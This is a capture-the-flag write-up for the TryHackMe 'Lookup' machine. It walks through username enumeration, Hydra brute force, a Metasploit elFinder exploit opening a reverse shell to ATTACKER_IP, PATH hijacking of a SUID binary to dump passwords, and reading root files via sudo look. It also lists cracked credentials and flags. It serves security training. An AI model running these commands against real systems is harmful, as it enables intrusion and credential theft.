# Lookup — TryHackMe Writeup

**Difficulty:** Easy | **Category:** Web + Privilege Escalation 

---

## Summary

A Linux machine combining web application exploitation with two privilege escalation techniques. The attack chain involves user enumeration, brute force, a known elFinder CVE, PATH hijacking on a custom SUID binary, and abusing `sudo` permissions on the `look` command.

---

## Reconnaissance

### Port Scan

```bash
nmap TARGET_IP -sV -p- --min-rate 5000
```

| Port | Service |
|------|---------|
| 22 | OpenSSH |
| 80 | Apache 2.4.41 (Ubuntu) |

### DNS Setup

Added to `/etc/hosts`:
```
TARGET_IP    lookup.thm files.lookup.thm
```

---

## Exploitation

### Step 1 — User Enumeration via Login Error Messages

The login page at `http://lookup.thm` returned different error messages depending on whether the username existed:

| Input | Response |
|-------|----------|
| Invalid user | `Wrong username or password.` |
| Valid user | `Wrong password.` |

Enumerated valid usernames with ffuf:

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
     -u http://lookup.thm/login.php \
     -X POST \
     -d "username=FUZZ&password=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -mr "Wrong password" \
     -t 50
```

**Found users:** `admin`, `jose`

### Step 2 — Brute Force with Hydra

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm \
      http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" \
      -t 30
```

**Credentials found:** `jose:password123`

### Step 3 — elFinder RCE (CVE-2019-9194)

Login redirected to `http://files.lookup.thm` — an elFinder 2.1.47 file manager instance.

Used Metasploit:

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS TARGET_IP
set VHOST files.lookup.thm
set TARGETURI /elFinder/
set LHOST ATTACKER_IP
run
```

Got a Meterpreter shell as `www-data`.

---

## Privilege Escalation

### www-data → think (PATH Hijacking)

Found a non-standard SUID binary:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/sbin/pwm
```

Running `/usr/sbin/pwm` revealed:
```
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

The binary calls `id` without an absolute path — vulnerable to **PATH Hijacking**.

**Attack:**

```bash
# Create a fake 'id' that returns 'think'
mkdir /tmp/fake
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/fake/id
chmod +x /tmp/fake/id

# Prepend our directory to PATH
export PATH=/tmp/fake:$PATH

# Run pwm — now reads /home/think/.passwords
/usr/sbin/pwm > /tmp/passwords.txt
```

The binary dumped a list of passwords belonging to `think`.

Brute forced SSH from the Kali machine:

```bash
hydra -l think -P /tmp/passwords.txt lookup.thm ssh
```

**Credentials found:** `think:josemario.AKA(think)`

```bash
ssh think@lookup.thm
```

**User flag:** `38375fb4dd8baa2b2039ac03d92b820e`

---

### think → root (sudo look)

```bash
sudo -l
# (ALL) /usr/bin/look
```

The `look` command searches for lines in files. With `sudo`, it can read any file on the system:

```bash
sudo look '' /root/root.txt
```

**Root flag:** `5a285a9f257e45c68bb6c9f9f57d18e8`

---

## Vulnerability Summary

| Vulnerability | Impact |
|---------------|--------|
| User enumeration via error messages | Revealed valid usernames |
| Weak password | Brute forceable via Hydra |
| elFinder CVE-2019-9194 | Remote Code Execution |
| SUID binary PATH Hijacking | Lateral movement to `think` |
| Sudo misconfiguration (`look`) | Full root access |

---

## Key Takeaways

- Different login error messages leak valid usernames — always normalize error messages
- `look` with sudo can read any file — GTFOBins lists many such binaries
- SUID binaries that call commands without absolute paths are vulnerable to PATH Hijacking
- Always check `/usr/sbin/` and `/usr/local/bin/` for non-standard SUID binaries
- elFinder 2.1.47 is a well-known vulnerable version — always keep file managers updated
